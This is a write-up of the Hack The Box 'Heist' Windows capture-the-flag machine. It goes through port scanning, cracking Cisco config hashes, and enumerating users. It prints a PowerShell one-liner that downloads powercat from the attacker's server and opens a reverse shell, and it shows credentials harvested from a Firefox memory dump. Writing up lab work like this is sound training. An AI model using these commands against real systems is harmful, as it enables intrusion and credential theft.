Heist - Windows machine from HTB

Initial port scanning against the target:

root@kali:~# nmap -v -p 1-65535 -sV -O -sS -T4 10.10.10.149

<img width="690" alt="1" src="https://user-images.githubusercontent.com/47299364/69317126-91160f80-0c3a-11ea-90f5-851907650dc8.png">

<img width="708" alt="2" src="https://user-images.githubusercontent.com/47299364/69317154-9d9a6800-0c3a-11ea-88b4-cf8d246a2e2e.png">

Cool, a webserver listening, let's check it out:

<img width="1395" alt="3" src="https://user-images.githubusercontent.com/47299364/69317197-b4d95580-0c3a-11ea-88fd-79cb5f6c1e2c.png">

Hum, login as guest? Let's go for it :)

<img width="1393" alt="4" src="https://user-images.githubusercontent.com/47299364/69317239-ca4e7f80-0c3a-11ea-9770-92c32c151f2a.png">

Sweet, even got a config file attached! Let's see the content:

<img width="615" alt="5" src="https://user-images.githubusercontent.com/47299364/69317268-ddf9e600-0c3a-11ea-9dd7-c485e2e54628.png">

Hum, interesting, Cisco config file. Well at least there are some user and hashes there. Let's crack them:

<img width="662" alt="6" src="https://user-images.githubusercontent.com/47299364/69317302-f7029700-0c3a-11ea-8cb6-82b17d0ef24f.png">
<img width="625" alt="7" src="https://user-images.githubusercontent.com/47299364/69317311-fe29a500-0c3a-11ea-8f4e-7ee7e0e82acd.png">

Ok so at this point we have two users and passwords that might be usefull later:

rout3r-$uperP@ssword  | 
admin-Q4)sJu\Y8qz*A3?d

The online tool i used to crack the above hashes was not able to retrieve the clear text password for the secret password:

So let's try to crack it in the hard way, using john with rockyou wordlist:

<img width="762" alt="8" src="https://user-images.githubusercontent.com/47299364/69317632-a6d80480-0c3b-11ea-852e-f5a16ff04623.png">

Voilá, password cracked:

<img width="453" alt="9" src="https://user-images.githubusercontent.com/47299364/69317655-b35c5d00-0c3b-11ea-8616-fa2b43bea6e6.png">

So now we have a second password but we don't have any user to match this:

stealth1agent

I need to admit that i guessed the user for this step. I saw the owner of the computer was "Hazard" so i guessed that there was at least one username with that name, and it was successfull:

I user smbmap to try to list for any smb shares available in the box:

<img width="721" alt="10" src="https://user-images.githubusercontent.com/47299364/69317869-2cf44b00-0c3c-11ea-9449-480b2091d9f6.png">

Unfortunately all the shares have "No Access" permissions. I can't list any files from there.

Let's try to use another tool, lookupsid.py to try to get users available in the system:

<img width="538" alt="11" src="https://user-images.githubusercontent.com/47299364/69318001-7cd31200-0c3c-11ea-912e-76aaf8532c62.png">

Nice, we got something. A couple new users are visible.

Then it was a game of trying the passwords i have from a couple steps above into the users available, until they worked with user Chase. The tool seen below it's a ruby script that will establish a powershell connection to the system:

New user:password pair: 
chase:Q4)sJu\Y8qz*A3?d

<img width="1006" alt="12" src="https://user-images.githubusercontent.com/47299364/69318163-dcc9b880-0c3c-11ea-91e1-abe29a733fb8.png">

And i got user flag:

<img width="517" alt="13" src="https://user-images.githubusercontent.com/47299364/69318186-e3583000-0c3c-11ea-8528-26db202ac605.png">

From here i tried to get a reverse shell back to my machine. For that i had setup a python simplehttpserver with the shell and ran the below command to get it into the box and establish the reverse shell straight away:

the command to establish the reverse shell: 
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.157/powercat/powercat.ps1');powercat -c 10.10.14.157 -p 9091 -e cmd"

<img width="1140" alt="14" src="https://user-images.githubusercontent.com/47299364/69318362-4d70d500-0c3d-11ea-9cea-775934716d64.png">

Found some interesting processes running on the server using PsList. So i've moved procdump using the same method to the box to try to dump those processes from memory:

<img width="665" alt="15" src="https://user-images.githubusercontent.com/47299364/69318455-827d2780-0c3d-11ea-94e6-b91ccdadc26f.png">

<img width="665" alt="16" src="https://user-images.githubusercontent.com/47299364/69318476-8dd05300-0c3d-11ea-9eb2-0246b26311f7.png">

And then i looked for specific patterns of the username found in the previous steps. It was successfull when i searched for the support user:

PS command: 
Get-ChildItem firefox.exe_191115_065903.dmp -Recurse -File | Select-String "supportdesk"

<img width="1043" alt="17" src="https://user-images.githubusercontent.com/47299364/69318558-ae98a880-0c3d-11ea-8aaa-645d8aa8d69e.png">

So now we have another user and credentials:

admin@support.htb:4dD!5}x/re8]FBuZ

Oh wow, looks like the support user is administrator on the box :) :)

Used the ruby script again with the support user:

<img width="535" alt="18" src="https://user-images.githubusercontent.com/47299364/69318844-4eeecd00-0c3e-11ea-9fb8-af8ccd32285b.png">

and got root flag:

<img width="448" alt="19" src="https://user-images.githubusercontent.com/47299364/69318866-57470800-0c3e-11ea-8e52-3fc44f0f99cf.png">

